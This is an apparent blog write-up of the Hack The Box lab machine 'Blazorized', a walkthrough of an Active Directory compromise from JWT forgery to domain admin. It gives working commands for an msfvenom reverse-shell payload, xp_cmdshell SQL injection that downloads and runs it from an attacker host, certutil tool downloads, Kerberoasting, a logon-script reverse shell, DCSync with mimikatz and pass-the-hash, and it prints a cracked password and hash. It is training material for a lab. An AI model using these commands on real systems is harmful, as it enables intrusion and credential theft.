---
date: 2024-11-07T18:46:04-06:00
# description: ""
image: "/images/HTB-Blazorized/Blazorized.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Blazorized"
type: "post"
---

* Platform: Hack The Box
* Link: [Blazorized](https://app.hackthebox.com/machines/Blazorized)
* Level: Hard
* OS: Windows
---

[Read this write up in french](https://scorpiosec.com/fr/posts/htb-blazorized/)

Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold.

Upon running Bloodhound, we discover that the current user has the `WriteSPN` privilege, enabling a targeted Kerberoasting attack for lateral movement to another user. This second user has permissions to modify the `Script-Path` of yet another user, allowing further lateral movement. After a second Bloodhound run, we find that our final user is in a group with the `DCSync` privilege on the Domain Controller, which we use to launch a DCSync attack in order to obtain the administrator’s hash.

Target IP address - `10.10.11.22`

## Scanning

```
./nmap_scan.sh 10.10.11.22 Blazorized
```

**Results**

```shell
Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49683,49708,49776
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 18:52 CST
Nmap scan report for 10.10.11.22
Host is up (0.065s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://blazorized.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-08 00:52:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-07T10:01:36
|_Not valid after:  2054-11-07T10:01:36
|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.10.11.22:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ms-sql-ntlm-info: 
|   10.10.11.22:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-07T10:01:36
|_Not valid after:  2054-11-07T10:01:36
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-08T00:53:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.71 seconds
```

From the nmap output we find several things:
* We are dealing with a domain controller (the domain name is `blazorized.htb`).
* There is a web server with a redirection to `http://blazorized.htb`.
* The target is running MSSQL on port `1433`.

## Enumeration

Before checking the web server we do some SMB enumeration, but both netexec and enum4linux fail.

![netexec smb enumeration](/images/HTB-Blazorized/netexec_smb_enum.png)

![enum4linux smb enumeration](/images/HTB-Blazorized/enum4linux_smb.png)

At `http://blazorized.htb/` we find a personal website built with Blazor Web Assembly.

![Blazorized website](/images/HTB-Blazorized/Blazorized_website.png)

![Blazorized wappalyzer](/images/HTB-Blazorized/Blazorized_tech_stack.png)

When we select the other sections such as `Interesting Digital Gardens` and `Misc. Links` we get the message `Failed fetching data from the API of Blazorized`.

![Blazorized failed data fetching](/images/HTB-Blazorized/failed_fetching.png)

In the `Check for Updates` section we learn that only the super admin can check the content. Although we are invited to use the button provided, clicking it only provides the message `Failed to Update Blazorized's Content!`.

![Blazorized check updates](/images/HTB-Blazorized/check_updates.png)

We continue our enumeration with some directory brute forcing but it is unfruitful.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blazorized.htb
```

With subdomain enumeration we discover `admin`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blazorized.htb -H "Host: FUZZ.blazorized.htb" -ic -fs 144
```

![subdomain enumeration](/images/HTB-Blazorized/subdomain_enum.png)

At `http://admin.blazorized.htb/` we find the super admin login page.

![super admin login](/images/HTB-Blazorized/super_admin_login.png)

When dealing with an application using a tech stack we are not familiar with, it is always a good thing to read the documentation. On this [Github page](https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#location-of-the-blazor-script) we learn that a Blazor application always need a Blazor script which is a critical file for the functioning on the app. 

We also read that Blazor web applications use json files.

![Blazor script location](/images/HTB-Blazorized/Blazor_script.png)

![Blazor json files](/images/HTB-Blazorized/blazor_json_files.png)

We bring up the developer tools (with the `F12` key) and find `_framework/blazor.webassembly.js`.

![Blazor script found in Blazorized](/images/HTB-Blazorized/blazor_script_found.png)

After opening it we find some code that is not well formatted, we use [beautifier.io](https://beautifier.io/) to make it more readable.

![Blazor script beautified](/images/HTB-Blazorized/js_file_beautified.png)

> I was overwhelmed by the amount of JavaScript code in front of me, and due to my inexperience with Blazor WebAssembly, I didn’t know what to look for. In hindsight, I should have focused more on the `_framework` directory, which holds the essential application files. It would have helped me find the exploitation path quicker.

We get a lot of JavaScript code but nothing really stands out. Let's move to Burp Suite, we will use the `Blazor Traffic Processor` extension to help with our enumeration.

![BTP extension](/images/HTB-Blazorized/BTP_extension.png)

Burp picks up a lot of dll files under `_framework`. We can download any of them by going to `http://blazorized.htb/_framework/xxx.dll` (example: `blazorized.htb/_framework/Markdig.dll`), but doing it manually will surely be tedious.

![DLL files found](/images/HTB-Blazorized/dll_files_found.png)

At the bottom of the DLL file list in Burp, we find a file called `blazor.boot.json`. This file serves as a reference for all the DLL files that need to be loaded for the application to function correctly.

![blazor boot json](/images/HTB-Blazorized/blazor_boot_json.png)

Going to `http://blazorized.htb/_framework/blazor.boot.json` does indeed bring up the same list of DLL files under `assembly` plus another file called `Blazorized.Helpers.dll` which we were not seeing in Burp.

![DLL files list](/images/HTB-Blazorized/DLL_files.png)

Further research revealed that it is not unusual for Blazor WebAssembly applications to expose their DLL files; in fact, this is part of how Blazor WebAssembly works.

These applications are unique in that they run client-side in the browser through WebAssembly. To execute .NET code in the browser:

1. The browser must download the DLL files, including application code and dependencies.
2. The WebAssembly runtime provided by Blazor loads and runs these DLLs on the client.

However, it is up to the developers of these applications to ensure that no **sensitive data or critical business logic** is included in the client-side DLL files.

Let's download the files and try to find something exploitable, we will use the python script below.

```python
import os
import requests
import json

json_url = 'http://blazorized.htb/_framework/blazor.boot.json'

output_dir = 'dll_files'
os.makedirs(output_dir, exist_ok=True)

response = requests.get(json_url)
data = response.json()

def download_dll(dll_name, dll_hash):
    dll_url = f'http://blazorized.htb/_framework/{dll_name}'
    file_path = os.path.join(output_dir, dll_name)
    
    try:
        dll_response = requests.get(dll_url)
        dll_response.raise_for_status()  # Check for request errors
        with open(file_path, 'wb') as file:
            file.write(dll_response.content)
        print(f'Downloaded {dll_name}')
    except requests.exceptions.RequestException as e:
        print(f'Failed to download {dll_name}: {e}')

if 'resources' in data and 'assembly' in data['resources']:
    for dll_name, dll_hash in data['resources']['assembly'].items():
        download_dll(dll_name, dll_hash)

if 'resources' in data and 'lazyAssembly' in data['resources']:
    for dll_name, dll_hash in data['resources']['lazyAssembly'].items():
        download_dll(dll_name, dll_hash)

print("Download complete.")
```

Let's use [decompiler.com](https://www.decompiler.com/) to decompile our DLL files (you can also use DNSpy on Windows).

> I went through a TON of decompilations that turned out to be useless so I'm going to skip to the right one.

Decompile `Blazorized.Helpers.dll` and go to `Blazorized.Helpers` --> `JWT.cs`. Here we find everything that is needed to create a Super Admin JWT token. We will use [jwt.io](https://jwt.io/) to generate it.

![JWT info](/images/HTB-Blazorized/JWT_info.png)

![JWT info2](/images/HTB-Blazorized/JWT_info2.png)

![JWT info3](/images/HTB-Blazorized/JWT_info3.png)

Below is all the information we need:

```
# For the Header (make sure to change the algorithm to 512 at the top of the page)

"alg": 512
"typ": "JWT"

# For the payload

"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb"
"http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin"
"iss": "http://api.blazorized.htb"
"aud": "http://admin.blazorized.htb"
"exp": "xxxxxxxxxxx" 

# In the VERIFY SIGNATURE section just paste the value of jwtSymmetricSecurityKey
```

> Do not use the `exp` value in the screenshot, it won't be valid anymore by the time you read this write up. Instead use [EpochConverter](https://www.epochconverter.com/) to generate a valid value. If the current time exceeds the `exp` timestamp, the token will be rejected as expired. (A good value to use is your current day at 11:59 PM, provided that it is not past that time yet).

![JWT value](/images/HTB-Blazorized/jwt_value.png)

Once you have your encoded value go to `http://admin.blazorized.htb/`, open the dev tools with `F12`, go to `Storage` --> `Local Storage` and add your token with

```
key = jwt
Value = YOUR_ENCODED_JWT
```

![JWT local storage](/images/HTB-Blazorized/jwt_local_storage.png)

After refreshing the page we access the Super Admin Panel.

![Super Admin Panel](/images/HTB-Blazorized/super_admin-panel.png)

## Initial Foothold

In the `Check Duplicate Post Titles` section we find a feature that is most likely using the datbase (MSSQL), we will use this and try to get a reverse shell via SQL injections.

1. We start by creating a malicious `exe` file.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f exe -o shell.exe
```

2. After setting up a web server, we drop the file on the target system.

```
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell 'powershell -c "curl http://YOUR_IP:WEBSERVER_PORT/shell.exe -o %TEMP%\shell.exe" --
```

![malicious file dropped on target](/images/HTB-Blazorized/revshell1.png)

3. We start a listener in Metasploit via `exploit/multi/handler`.

4. We execute the malicous `exe` file on the target and obtain a meterpreter shell as `NU_1055`.

```
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 EXEC master.dbo.xp_cmdshell ' %TEMP%\shell.exe --
```

![Meterpreter shell foothold](/images/HTB-Blazorized/foothold.png)

We find the user flag in the user Desktop.

![user flag](/images/HTB-Blazorized/user_flag.png)

### Lateral Movement (shell as RSA_4810)

Usually we would run Bloodhound with some credentials in order to gather all the data about the domain. When we do not have access to any credentials we can use [SharpHound](https://github.com/BloodHoundAD/SharpHound) to obtain that information.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
```

![SharpHound transfer](/images/HTB-Blazorized/download_sharphound.png)

![SharpHound zip file](/images/HTB-Blazorized/sharhound_zip.png)

We download the `zip` archive on our local machine, extract it, and load the files in Bloodhound.

Find user `NU_1055`, then go to `Node Info` --> `First Degree Object Control` under `OUTBOUND OBJECT CONTROL`. We discover that the user has the `WriteSPN` right over the user `RSA_4810`.

> SPNs are identifiers used by Kerberos to associate a service with a particular account in Active Directory. When a client requests access to a service (identified by its SPN), it requests a Service Ticket for that service from the Domain Controller. For our Kerberoast attack, we will request a Service Ticket for the specific SPN we will create. Since Service Tickets are encrypted with the NTLM hash of the service account’s password, after obtaining these tickets, we can try to crack the hash offline in order recover the service account password.

![WriteSPN abuse](/images/HTB-Blazorized/WriteSPN_Abuse.png)

1. Transfer `PowerView.ps1` to the target.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
```

![PowerView file transfer](/images/HTB-Blazorized/powerview_transfer.png)

* Switch to a PowerShell prompt and import the PowerView module with the command below

```
Import-Module ./powerview.ps1
```

2. Add an arbitrary SPN to user `RSA_4810` account.

```
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='darryl/kscorpio'}
```

3. Request a Kerberos Ticket, receive the password hash of `RSA_4810` and crack it offline.

```
Get-DomainSPNTicket -SPN darryl/kscorpio 
```

> You will need to do some formatting when you copy the hash because it is full of whitespaces.

![Targeted kerberoast attack](/images/HTB-Blazorized/targeted_kerberoasting.png)

Using hashcat we crack the hash and recover the password `(Ni7856Do9854Ki05Ng0005 #)`.

```
hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
```

![RSA_4810 password](/images/HTB-Blazorized/RSA_4810_pwd.png)

We can now login as `RSA_4810`.

```
evil-winrm -u RSA_4810 -p "(Ni7856Do9854Ki05Ng0005 #)" -i blazorized.htb
```

This account does not seem to have anything interesting file-wise. Besides `Administrator` the only other user present in `C:\Users` is `SSA_6010`, so we probably need to move to this user.

### Lateral Movement (shell as SSA_6010)

Let's enumerate the ACLs in the domain involving permissions related to the user `RSA_4810`.

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "rsa_4810"}
```

![ACL script-path information](/images/HTB-Blazorized/write_scriptpath.png)

It turns out that `RSA_4810` has permission to modify the `Script-Path` property for `SSA_6010`. When I try to query the specific `scriptPath` for `SSA_6010` it comes back empty. This probably means that no logon script is currently set for the user.

![scriptPath query](/images/HTB-Blazorized/scriptPath_query.png)

The path to those scripts is usually relative to a network share designated for logon scripts such as the `SYSVOL` directory, it looks like we will need to manually find the directory and find which file we can write to. Its standard location is `C:\Windows\SYSVOL`.

In `C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts` we discover that we have Full permissions on the directory `A32FF3AEAA23`.

![SYSVOL directory permissions](/images/HTB-Blazorized/SYSVOL_dir_perm.png)

1. We set a logon script for the user `SSA_6010`.

```
Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\revshell.bat' 
```

2. We write a PowerShell reverse shell to `revshell.bat`, which will be automatically executed when `SSA_6010` logs in.

* Get a PowerShell reverse shell on [revshells.com](https://www.revshells.com/), use the `PowerShell#3 (Base64)`.

```
 echo "powershell -e JAB..." | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
```

![Logon script revshell](/images/HTB-Blazorized/logon_script_revshell.png)

On our listener we catch a shell as `SSA_6010`.

![SSA_6010 shell](/images/HTB-Blazorized/SSA_6010_shell.png)

## Privilege Escalation

We switch to a meterpreter shell, upload SharpHound to the target an run it a second time.

`SSA_6010` is part of the `Super_Support_Administrators` group.

![SSA_6010 group memberships](/images/HTB-Blazorized/SSA_6010_group_membership.png)

The members of this group have the `DCSync` right on the Domain Controller. We can use this right to achieve a DCSync attack and get the administrator password hash.

> DCSync right is a permission typically granted to Domain Controllers in an AD environment. It is used to replicate directory information, including account credentials, across the domain. When a server has this permission, it can perform directory synchronization operations to keep data consistent between different domain controllers. With this right we can pretend to be a Domain Controller by sending a `DRSGetNCChanges` request to the target Domain Controller and when the Domain Controller responds, it sends sensitive information back to us, including password hashes for the requested accounts.

![DCSync Abuse](/images/HTB-Blazorized/DCSync_abuse.png)

```
certutil.exe -urlcache -split -f http://YOUR-IP:WEBSERVER_PORT/mimikatz.exe mimikatz.exe
```

Execute mimikatz with `.\mimikatz.exe` and to get the admin hash, run the following command.

```
lsadump::dcsync /domain:blazorized.htb /user:administrator
```

![admin password hash](/images/HTB-Blazorized/admin-hash.png)

Now we login as `Administrator` with the hash, and read the root flag.

```
 evil-winrm -i 10.10.11.22 -u Administrator -H "f55ed1465179ba374ec1cad05b34a5f3" 
```

![Root flag](/images/HTB-Blazorized/root_flag.png)

This was a great box, I learned a lot pawning it. Below are some references that were useful to me. Thank you for reading this article and I hope it was of any help to you.

* [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
* [SPN-jacking](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
* [ASP.NET Core Blazor WebAssembly .NET runtime and app bundle caching](https://learn.microsoft.com/en-us/aspnet/core/blazor/host-and-deploy/webassembly-caching/?view=aspnetcore-8.0)
* [Blazor Web App structure](https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#blazor-web-app)
